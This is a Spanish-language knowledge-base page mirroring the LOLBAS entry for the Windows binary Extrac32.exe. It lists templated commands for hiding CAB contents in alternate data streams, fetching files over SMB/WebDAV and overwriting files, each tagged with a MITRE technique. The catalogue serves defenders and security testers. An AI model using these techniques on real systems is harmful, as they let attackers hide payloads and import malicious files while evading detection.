# LOLBAS: Extrac32.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Copy`, `Download`

Extract to ADS, copy or overwrite a file with Extrac32.exe

## Comandos

### Extract data from cab file and hide it in an alternate data stream.

ADS · priv: User · T1564.004

```cmd
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
```

Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.

### Extract data from cab file and hide it in an alternate data stream.

ADS · priv: User · T1564.004

```cmd
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
```

Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.

### Download file from UNC/WEBDav

Download · priv: User · T1105

```cmd
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}
```

Copy the source file to the destination file and overwrite it.

### Copy file

Copy · priv: User · T1105

```cmd
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}
```

Command for copying file from one folder to another

